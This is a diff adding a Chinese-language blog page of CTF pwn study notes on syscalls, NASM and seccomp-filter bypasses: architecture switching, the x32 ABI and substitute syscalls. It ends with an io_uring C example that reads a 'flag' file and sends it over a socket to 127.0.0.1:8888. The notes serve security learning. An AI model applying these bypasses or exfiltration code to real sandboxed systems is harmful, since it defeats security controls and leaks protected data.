@@ -1,0 +1,201 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>giacomo&#39;s journal</title>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.8.0/highlight.min.js"></script>
+    <script src="https://unpkg.com/highlightjs-copy/dist/highlightjs-copy.min.js"></script>
+
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.8.0/styles/default.min.css">
+    <link
+    rel="stylesheet"
+    href="https://unpkg.com/highlightjs-copy/dist/highlightjs-copy.min.css"
+    />
+    <script>hljs.highlightAll();</script>
+    <script>hljs.addPlugin(new CopyButtonPlugin());</script>
+
+
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    
+<script src="/js/jquery-3.7.1.min.js"></script>
+
+    
+<script src="/js/bootstrap-transition.js"></script>
+
+    
+<script src="/js/zoom.js"></script>
+
+
+    <style>
+        .markdown-body {
+            box-sizing: border-box;
+            min-width: 200px;
+            max-width: 980px;
+            margin-left: 28%;
+            margin-top: 6%;
+
+            padding: 45px;
+        }
+
+        @media (max-width: 767px) {
+            .markdown-body {
+                padding: 15px;
+            }
+        }
+    </style>
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+<body>
+    <header class="header">
+
+    <div class="navbar-left">
+        <div class="avatar">
+            <a href="/">
+                <img src="https://91ac0m0.github.io/img/avatar.jpg"alt="avatar">
+            </a>
+        </div>
+        <div class="nav-title">
+            <a class="nav-brand" href="/">giacomo</a>
+        </div>
+    </div>
+    <div class="navbar-right">
+        <ul class="nav-links">
+            
+                <div class="nav-link">
+                    <a href="/about" class="menu-item-link">
+                        about
+                    </a>
+                </div>
+            
+        </ul>
+
+    </div>
+    
+
+</header>
+
+    <div class = "toc_left">
+	
+    <div id="toc">
+        <!-- <strong class="sidebar-title">目录</strong> -->
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#syscall-table"><span class="toc-text">syscall table</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#man"><span class="toc-text">man</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Nasm"><span class="toc-text">Nasm</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Seccomp-bypass-%E7%9A%84%E4%B8%80%E4%BA%9B%E6%80%BB%E7%BB%93"><span class="toc-text">Seccomp bypass 的一些总结</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9E%B6%E6%9E%84"><span class="toc-text">架构</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#x32-ABI"><span class="toc-text">x32 ABI</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%80%E4%BA%9B%E5%A5%87%E6%80%AA%E7%9A%84-syscall"><span class="toc-text">一些奇怪的 syscall</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%9B%BF%E4%BB%A3-open-%E7%9A%84-syscall"><span class="toc-text">替代 open 的 syscall</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%9B%BF%E4%BB%A3-read-write-%E7%9A%84-syscall"><span class="toc-text">替代 read write 的 syscall</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#io-uling"><span class="toc-text">io uling</span></a></li></ol></li></ol>
+    </div>
+
+</div>
+<article class="markdown-body">
+	<div></div><h2 id="syscall-table"><a href="#syscall-table" class="headerlink" title="syscall table"></a>syscall table</h2><p>在翻 syscall table</p>
+<p><a target="_blank" rel="noopener" href="https://manpages.ubuntu.com/manpages/jammy/en/man2/syscalls.2.html">https://manpages.ubuntu.com/manpages/jammy/en/man2/syscalls.2.html</a></p>
+<h2 id="man"><a href="#man" class="headerlink" title="man"></a>man</h2><p><a target="_blank" rel="noopener" href="https://nju-projectn.github.io/ics-pa-gitbook/ics2021/man.html">man</a></p>
+<h2 id="Nasm"><a href="#Nasm" class="headerlink" title="Nasm"></a>Nasm</h2><ul>
+<li><p>rel<br>[ 取址 ] 是绝对的，加上 <code>rel</code> 或者 <code>default rel</code> 转换成相对寻址</p>
+</li>
+<li><p>申明<br>equ 和 req 定义的存在 bss 中</p>
+</li>
+</ul>
+<p>dx times</p>
+<ul>
+<li>引用库函数</li>
+</ul>
+<p>调用 <a target="_blank" rel="noopener" href="https://stackoverflow.com/questions/52126328/cant-call-c-standard-library-function-on-64-bit-linux-from-assembly-yasm-code">rel puts wrt .. got</a></p>
+<ul>
+<li>调用约定</li>
+</ul>
+<p>调用前 rsp 必须 16 字节对齐</p>
+<p>被调用函数需要保留的唯一寄存器（calle-save 寄存器）是： <code>rbp</code>  <code>r12</code>  <code>r13</code> <code>r14</code> <code>r15</code> <code>rbx</code> 。所有其他函数都可以由被调用的函数自由更改。</p>
+<h2 id="Seccomp-bypass-的一些总结"><a href="#Seccomp-bypass-的一些总结" class="headerlink" title="Seccomp bypass 的一些总结"></a>Seccomp bypass 的一些总结</h2><h3 id="架构"><a href="#架构" class="headerlink" title="架构"></a>架构</h3><p>如果没有限制架构，没有下面这个规则</p>
+<pre><code class="text"> 0000: 0x20 0x00 0x00 0x00000004  A = arch
+ 0001: 0x15 0x00 0x19 0xc000003e  if (A != ARCH_X86_64) goto 0027
+</code></pre>
+<p>通过给 cs 寄存器赋值，可以切换到 x86 架构，如果 x86 和 x64 的 syscall  number 不同那么成功绕过。</p>
+<p><a target="_blank" rel="noopener" href="http://wh4lter.icu/2020/04/20/seccomp/#%E6%9C%AA%E6%A3%80%E6%9F%A5architecture-switching-x64-mode-to-x86-mode">参考</a></p>
+<h3 id="x32-ABI"><a href="#x32-ABI" class="headerlink" title="x32 ABI"></a>x32 ABI</h3><p>x32 的 syscall 是 x64 syscall 加上 0x40000000</p>
+<pre><code class="text"> 0002: 0x20 0x00 0x00 0x00000000  A = sys_number
+ 0003: 0x35 0x00 0x01 0x40000000  if (A &lt; 0x40000000) goto 0005
+</code></pre>
+<p><a target="_blank" rel="noopener" href="https://blog.wingszeng.top/pwn-shellcode-and-syscall/#2022-minil-shellcode">参考</a></p>
+<h3 id="一些奇怪的-syscall"><a href="#一些奇怪的-syscall" class="headerlink" title="一些奇怪的 syscall"></a>一些奇怪的 syscall</h3><p>（虽然有 syscal 文档）。一个快速看 syscall number 的工具 ausyscall</p>
+<h4 id="替代-open-的-syscall"><a href="#替代-open-的-syscall" class="headerlink" title="替代 open 的 syscall"></a>替代 open 的 syscall</h4><ul>
+<li><p><code>openat</code> : 相比起 <code>open</code> 增加了 <code>dirfd</code> 参数，目录的选择更灵活了</p>
+</li>
+<li><p><code>openat2</code> ：区别于用 <code>flags</code> 来指定模式，它传递 <code>open_how</code> 结构，有了更多扩展性</p>
+</li>
+<li><p><code>open_by_handle_at</code>  和  <code>name_to_handle_at</code>  组成了 <code>openat</code></p>
+</li>
+<li><p><code>open_tree</code>  不懂怎么用，手册上没有，但是好像可以打开（</p>
+</li>
+<li><p><code>creat</code> 一个古老的系统调用，以写模式打开文件</p>
+</li>
+</ul>
+<h4 id="替代-read-write-的-syscall"><a href="#替代-read-write-的-syscall" class="headerlink" title="替代 read write 的 syscall"></a>替代 read write 的 syscall</h4><ul>
+<li><p><code>pread</code> <code>pwrite</code>：指定文件内容的偏移</p>
+</li>
+<li><p><code>readv</code>  <code>writev</code> ： 以 clutter 形式读写多个 buffer</p>
+</li>
+<li><p><code>preadv</code> <code>pwritev</code>：p 和 v 的结合</p>
+</li>
+<li><p><code>preadv2 </code> <code>pwritev2</code> :  增加了 flags</p>
+</li>
+</ul>
+<p>以上是同步 io，一个古老的 <code>aio</code>  提供了异步功能</p>
+<ul>
+<li><code>socket</code>  <code>connet</code>  <code>senfile</code> <code>sendto</code> ：通过 socket 发出去</li>
+</ul>
+<h3 id="io-uling"><a href="#io-uling" class="headerlink" title="io uling"></a>io uling</h3><p>异步 io <a target="_blank" rel="noopener" href="https://unixism.net/loti/index.html">io_uring</a></p>
+<p>一个例子是</p>
+<pre><code class="c">#include &lt;stdlib.h&gt;
+#include &lt;unistd.h&gt;
+#include &lt;arpa/inet.h&gt;
+#include &lt;stdio.h&gt;
+#include &lt;sys/socket.h&gt;
+#include &lt;liburing.h&gt;
+int main() &#123;
+
+    //初始化
+    struct io_uring ring;
+    int ret = io_uring_queue_init(64, &amp;ring, 0);
+
+    // 提交请求
+    struct io_uring_sqe *sqe = io_uring_get_sqe(&amp;ring);
+    io_uring_prep_openat(sqe, -100, &quot;flag&quot;,RWF_APPEND , MS_RDONLY);
+    io_uring_submit(&amp;ring);
+
+    // 返回结果
+    struct io_uring_cqe *cqe;
+    io_uring_wait_cqe(&amp;ring, &amp;cqe);
+    io_uring_cqe_seen(&amp;ring, cqe);
+
+    // 处理打开结果
+    int opened_fd = cqe-&gt;res;
+
+    // socket init
+    int fd = socket(AF_INET, SOCK_STREAM, 0);
+    
+    //set socket addr
+    struct sockaddr_in serv_addr =&#123;0&#125;;
+    serv_addr.sin_family = AF_INET;
+    serv_addr.sin_addr.s_addr = inet_addr(&quot;127.0.0.1&quot;);
+    serv_addr.sin_port = htons(8888);
+
+    //connect
+    connect(fd, (struct sockaddr *)&amp;serv_addr, sizeof(serv_addr));
+
+    //send data
+    sendfile( fd,opened_fd, 0, 0x20);
+
+    close(opened_fd);
+    io_uring_queue_exit(&amp;ring);
+    return 0;
+&#125;
+</code></pre>
+</div>
+</article>
+
+<script src="/js/image_pop_up.js"></script>
+
+	
+
+</body>
+</html>
